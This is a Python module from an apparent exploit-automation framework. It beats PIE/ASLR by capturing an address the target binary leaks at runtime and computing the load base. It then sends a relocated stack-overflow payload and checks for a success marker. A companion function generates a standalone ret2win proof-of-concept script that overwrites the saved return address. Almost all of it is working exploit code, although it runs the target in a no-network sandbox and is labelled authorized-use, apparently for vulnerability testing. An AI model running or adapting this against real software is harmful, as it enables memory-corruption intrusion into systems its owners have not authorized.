"""PIE exploitation via a runtime info-leak (Phase 9 frontier, analyst-in-the-loop).

A PIE binary loads at a randomized base, so static addresses are useless until a runtime
**info-leak** reveals a real address. This drives the target interactively in ONE process
(defeating live ASLR): read the leaked address from its output, compute the load base, send a
payload whose addresses are relocated to that base, and verify the exploit by an observable
success marker. The analyst supplies what the target leaks and how success shows (doc 15).
"""
from __future__ import annotations

import os
import re
import select
import subprocess
import time
from pathlib import Path

from ..dynamic import sandbox


def _kill(p):
    try:
        os.killpg(os.getpgid(p.pid), 9)
    except OSError:
        try:
            p.kill()
        except OSError:
            pass


def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset: int,
                     payload_for_base, success_regex: str, timeout: float = 8.0,
                     mem_mb: int = 2048) -> dict:
    """Interactive single-process leak → relocate → exploit over stdin/stdout.

    `leak_base_offset` is the static offset (from the image base) of whatever address the
    target leaks, so base = leaked - leak_base_offset. `payload_for_base(base)->bytes` builds
    the relocated payload. Success = `success_regex` appears in the post-payload output.
    """
    rx = re.compile(leak_regex.encode("latin-1"))
    ok = re.compile(success_regex.encode("latin-1"))
    preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
    # The leak harness reads only the target's stdout, so it needs no control channel: contain
    # it fully (read-only fs, tmpfs, private pid + network namespace) when bwrap is available.
    exedir = str(Path(exe).resolve().parent)
    cmd = sandbox.isolate_prefix(exedir, net=False) + \
        [str(exe)] + [str(a) for a in base_argv]
    try:
        p = subprocess.Popen(cmd,
                             stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, start_new_session=True,
                             preexec_fn=preexec)
    except Exception as e:
        return {"ok": False, "reason": f"spawn failed: {e!r}"}

    deadline = time.time() + timeout
    buf = b""
    leaked = None
    try:
        while time.time() < deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                buf += chunk
                m = rx.search(buf)
                if m:
                    grp = m.group(1) if m.groups() else m.group(0)
                    leaked = int(grp, 16)
                    break
            elif p.poll() is not None:
                break
        if leaked is None:
            _kill(p)
            return {"ok": False, "reason": "no leak matched before the target read input",
                    "output": buf[:400].decode("latin-1", "ignore")}

        base = leaked - leak_base_offset
        payload = payload_for_base(base)
        sent_at = len(buf)          # only output AFTER this can confirm the RELOCATED payload worked
        try:
            p.stdin.write(payload)
            p.stdin.flush()
            p.stdin.close()
        except (BrokenPipeError, OSError):
            pass

        out = buf
        # A FRESH budget for the confirmation read: the leak may have arrived just before `deadline`,
        # which would otherwise leave this loop zero iterations and miss a genuine success marker.
        post_deadline = time.time() + timeout
        while time.time() < post_deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                out += chunk
            elif p.poll() is not None:
                break
        # Search ONLY the post-payload bytes: a success_regex that merely appears in the target's
        # normal startup/leak output (pre-payload) must not declare a false "demonstrated".
        return {"ok": True, "leaked": leaked, "base": base,
                "success": bool(ok.search(out[sent_at:])),
                "output": out[:800].decode("latin-1", "ignore")}
    finally:
        _kill(p)
        try:
            p.wait(timeout=2)
        except Exception:
            pass


def render_ret2win_script(leak_regex, leak_base_offset, off_win, offset) -> bytes:
    """A self-contained, stdlib-only reproducer: leak -> compute base -> ret2win. This is the
    portable PoC for a PIE target (the raw payload is base-specific and cannot be static)."""
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 PIE exploit (leak -> ret2win). Authorized-use only.\n"
        "import re, struct, subprocess, sys\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './poc/target.bin'\n"
        f"LEAK_RE = {leak_regex!r}\n"
        f"LEAK_OFF = {leak_base_offset:#x}   # static offset of the leaked symbol\n"
        f"WIN_OFF  = {off_win:#x}            # static offset of the win function\n"
        f"OFFSET   = {offset}                # overflow offset to saved return address\n"
        "def cyclic(n):\n"
        "    a=b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\n"
        "    out=bytearray(); i=0\n"
        "    while len(out)<n:\n"
        "        out+=bytes([a[i%len(a)]]); i+=1\n"
        "    return bytes(out[:n])\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE)\n"
        "leaked=None\n"
        "for line in p.stdout:                       # read whole lines: the address is complete\n"
        "    m=re.search(LEAK_RE.encode(),line)\n"
        "    if m: leaked=int((m.group(1) if m.groups() else m.group(0)),16); break\n"
        "if leaked is None:\n"
        "    sys.stderr.write('no leak captured\\n'); sys.exit(1)\n"
        "base=leaked-LEAK_OFF\n"
        "print('leaked %#x -> base %#x -> win %#x'%(leaked,base,base+WIN_OFF))\n"
        "p.stdin.write(cyclic(OFFSET)+struct.pack('<Q',base+WIN_OFF)+b'C'*8)\n"
        "p.stdin.close()\n"
        "print(p.stdout.read().decode('latin-1','ignore'))\n"
    ).encode()
